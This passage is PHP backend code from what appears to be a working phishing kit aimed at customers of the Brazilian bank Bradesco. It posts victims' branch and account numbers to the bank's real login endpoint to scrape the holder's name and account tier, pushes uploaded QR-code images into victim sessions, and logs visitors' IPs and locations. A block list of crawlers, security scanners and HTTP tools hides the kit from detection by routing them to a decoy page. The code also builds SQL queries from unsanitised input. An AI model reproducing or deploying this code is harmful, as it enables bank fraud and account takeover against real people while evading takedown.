    $result_qnt_visitas = "SELECT count(id) as online FROM visitas WHERE data_final >= '" . $data['online'] . "'";

    $resultado_qnt_visitas = mysqli_query($ConnectDB, $result_qnt_visitas);
    $row_qnt_visitas = mysqli_fetch_assoc($resultado_qnt_visitas);

    echo $row_qnt_visitas['online'];
}

if ($_GET['app'] == 'qrcode-erro') {

    $name = $_FILES['file']['name'];
    $target_dir = "qrcode/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);

    // Select file type
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Valid file extensions
    $extensions_arr = array("jpg", "jpeg", "png", "gif");

    // Check extension
    if (in_array($imageFileType, $extensions_arr)) {
        // Upload file
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_dir . $name)) {
            // Convert to base64 
            $image_base64 = base64_encode(file_get_contents('qrcode/' . $name));
            $image = 'data:image/' . $imageFileType . ';base64,' . $image_base64;

            // Insert record
            $result_usuario = "UPDATE infos SET qrcode='" . $image . "', comando='qrcode_erro' where id='" . $_GET['client_id'] . "'";
            mysqli_query($ConnectDB, $result_usuario);
            mysqli_query($ConnectDB, $query);

            print 'true';

            unlink('qrcode/' . $name);
        }
    } else {
        print 'false';
    }
}
////BUSCAR TITULAR////

function random($size)
{
    $KEYS = "ABCDEFGHJKMNOPQRSTUWXYZ0123456789";
    $str = array();
    $lenghth = strlen($KEYS) - 1;
    for ($i = 0; $i < $size; $i++) {
        $n = rand(0, $lenghth);
        $str[] = $KEYS[$n];
    }
    return implode($str);
}

function getNome2($agencia, $conta)
{
    $digitoConta = substr($conta, -1);
    $conta = substr($conta, 0, strlen($conta) - 1);

    $part = random(10);
    $ga = random(1) . "." . random(8) . "." . random(9) . "." . $part . "-" . random(9) . "." . $part;

    $agencia = str_pad($agencia, 4, "0", STR_PAD_LEFT);


    $ch = curl_init("https://www.ib12.bradesco.com.br/ibpfnovologin/identificacao.jsf?_ga=" . $ga);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $fields = "AGN=" . $agencia . "&CTA=" . $conta . "&DIGCTA=" . $digitoConta . "&EXTRAPARAMS=&ORIGEM=101";
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Length: ' . strlen($fields);
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: www.ib12.bradesco.com.br';
    $headers[] = 'Origin: https://banco.bradesco';
    $headers[] = 'Referer: https://banco.bradesco/html/classic/index.shtm';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-Site: cross-site';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36';

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $output = curl_exec($ch);


    preg_match_all('/Ol&#225;,\s(\w+)/', $output, $nome);

    $retorno = array();
    $retorno['nome'] = "";


    if (isset($nome) && isset($nome[1]) && isset($nome[1][0]) && strlen($nome[1][0]) > 0) {
        $retorno['nome'] = $nome[1][0];
    }

    preg_match_all('/Confira seu Nome, (\w+)[\'\"]/', $output, $nomePrimeiroAcesso);


    if (isset($nomePrimeiroAcesso) && isset($nomePrimeiroAcesso[1]) && isset($nomePrimeiroAcesso[1][0]) && strlen($nomePrimeiroAcesso[1][0]) > 0) {
        $retorno['nome'] = $nomePrimeiroAcesso[1][0];
    }

    $retorno['titulares'] = array();

    if (strlen($retorno['nome']) == 0) {


        preg_match_all('/<span\s{0,}id="radNome\d{2}"\s{0,}for="radNome\d{2}"\s{0,}>(\w+)<\/span>/', $output, $titulares);


        if (isset($titulares[1])) {
            foreach ($titulares[1] as $titular) {

                array_push($retorno['titulares'], $titular);
            }
        }
    }

    $retorno['exclusive'] = false;
    $retorno['prime'] = false;
    $retorno['classic'] = false;

    if (strpos($output, '<body class="exclusive">') !== false) {
        $retorno['exclusive'] = true;
        $_SESSION['tipo_conta'] = 'exclusive';
    }


    if (strpos($output, '<body class="prime">') !== false) {
        $retorno['prime'] = true;
        $_SESSION['tipo_conta'] = 'prime';
    }

    if (strpos($output, '<body class="varejo">') !== false) {
        $retorno['classic'] = true;
        $_SESSION['tipo_conta'] = 'classic';
    }
    //var_dump($titular);
    $_SESSION['titular'] = $retorno['nome'];

    print '{"nome":"' . $retorno['nome'] . '","titulares":[],"exclusive":false,"prime":false}';

    return $retorno;
}

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


function getNome($agencia, $conta)
{
    $digitoConta = substr($conta, -1);
    $conta = substr($conta, 0, strlen($conta) - 1);

    $part = random(10);
    $ga = random(1) . "." . random(8) . "." . random(9) . "." . $part . "-" . random(9) . "." . $part;

    $agencia = str_pad($agencia, 4, "0", STR_PAD_LEFT);


    $ch = curl_init("https://www.ib12.bradesco.com.br/ibpflogin/identificacao.jsf?_ga=" . $ga);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $fields = "AGN=" . $agencia . "&CTA=" . $conta . "&DIGCTA=" . $digitoConta . "&EXTRAPARAMS=&ORIGEM=101";
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Length: ' . strlen($fields);
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: www.ib12.bradesco.com.br';
    $headers[] = 'Origin: https://banco.bradesco';
    $headers[] = 'Referer: https://banco.bradesco/html/classic/index.shtm';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-Site: cross-site';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36';

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $output = curl_exec($ch);


    preg_match_all('/[Boa,Bom] (\w+),<span>(\w+)<\/span>/', $output, $nome);

    $retorno = array();
    $retorno['nome'] = "";

    if (isset($nome) && isset($nome[2]) && isset($nome[2][0]) && strlen($nome[2][0]) > 0) {
        $retorno['nome'] = $nome[2][0];
    }

    preg_match_all('/Confira seu Nome, (\w+)[\'\"]/', $output, $nomePrimeiroAcesso);


    if (isset($nomePrimeiroAcesso) && isset($nomePrimeiroAcesso[1]) && isset($nomePrimeiroAcesso[1][0]) && strlen($nomePrimeiroAcesso[1][0]) > 0) {
        $retorno['nome'] = $nomePrimeiroAcesso[1][0];
    }

    $retorno['titulares'] = array();

    if (strlen($retorno['nome']) == 0) {


        preg_match_all('/<label id="radNome\w{2}" for="radNome\w{2}" >(\w+)<\/label>/', $output, $titulares);

        if (isset($titulares[1])) {
            foreach ($titulares[1] as $titular) {

                array_push($retorno['titulares'], $titular);
            }
        }
    }

    $retorno['exclusive'] = false;

    if (strpos($output, 'exclusive') !== false) {
        $retorno['exclusive'] = true;
    }

    return $retorno;
}

if ($_GET['consultar'] == 'titular') {

    $agencia = $_POST['agencia'];
    $conta = $_POST['conta'];
    $digito = $_POST['digito'];

    $conta_normal = $conta . $digito;

    getNome2($agencia, $conta_normal);
}

////BUSCAR TITULAR////


function verificar_agent_block()
{
    $palavras = array(
        'facebookexternalhit',
        'facebook',
        'Facebot',
        'Googlebot',
        'Bingbot',
        'DuckDuckBot',
        'YandexBot',
        'Baiduspider',
        'MJ12bot',
        'SemrushBot',
        'AhrefsBot',
        'Slackbot',
        'TelegramBot',
        'WhatsApp',
        'Twitterbot',
        'LinkedInBot',
        'Pinterest',
        'Discordbot',
        'Applebot',
        //'Cloudflare',
        'PhantomJS',
        'HeadlessChrome',
        'Python-urllib',
        'curl',
        'wget',
        'PostmanRuntime',
        'Java',
        'Apache-HttpClient',
        'Go-http-client',
        'okhttp',
        'libwww-perl',
        'Scrapy',
        'HttpClient',
        'axios',
        'node-fetch',
        'GuzzleHttp',
        'HttpURLConnection',
        'urllib',
        'bot',
        'crawler',
        'spider',
        'monitor',
        'scanner',
        'checker',
        'validator',
        'google',
        'Googlebot',
        'AdsBot-Google',
        'Googlebot-Image',
        'Googlebot-Video',
        'Googlebot-News',
        'Mediapartners-Google',
        'APIs-Google',
        'Google Favicon',
        'Google Web Preview'
    );

    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $date = date('d/m/Y - H:i');

    $dados_ISP_LIVE = "(" . $_GET['app'] . ") - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";
    $dados_AGENT_BLOCK = "(AGENT BLOCK) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";

    if (preg_match(sprintf('/%s/i', implode('|', $palavras)), $useragent)) {
        file_put_contents("./webdriver/die.db", $dados_AGENT_BLOCK, FILE_APPEND);
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    } else {
        if (empty($_GET['app'])) {
            pishing_x9('./webdriver/paginas/x9.php');
            exit();
        }
        $_SESSION['device_unlock'] = $_SESSION['cidade'];
        file_put_contents("./webdriver/live.db", $dados_ISP_LIVE, FILE_APPEND);
    }
}

function verificar_liberacao()
{
    if (empty($_SESSION['device_unlock'])) {
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    } else {

        if (empty($_GET['app'])) {
            pishing_x9('./webdriver/paginas/x9.php');
            exit();
        }

        $upper = implode('', range('A', 'Z'));
        $lower = implode('', range('a', 'z'));
        $nums = implode('', range(0, 9));

        $alphaNumeric = $upper . $lower . $nums;
        $string = '';
        $len = 100;
        for ($i = 0; $i < $len; $i++) {
            $string .= $alphaNumeric[rand(0, strlen($alphaNumeric) - 1)];
        }

        $_SESSION['string'] = $string;

        header('Location: ./acesso/?app=' . $_GET['app'] . '&acao=login&random=' . $string . '');
        exit;

        //header('Location: ./web/?app=' . $_GET['app'] . '&acao=login&random=' . $string . '');

    }
}

function verifica_session_conta()
{

    if (empty($_SESSION['conta'])) {
        pishing_x9('../webdriver/paginas/x9.php');
        exit();
    }
}

function verifica_session_serial()
{

    if (empty($_SESSION['unlock_conta'])) {
        pishing_x9('../webdriver/paginas/x9.php');
        exit();
    }
}
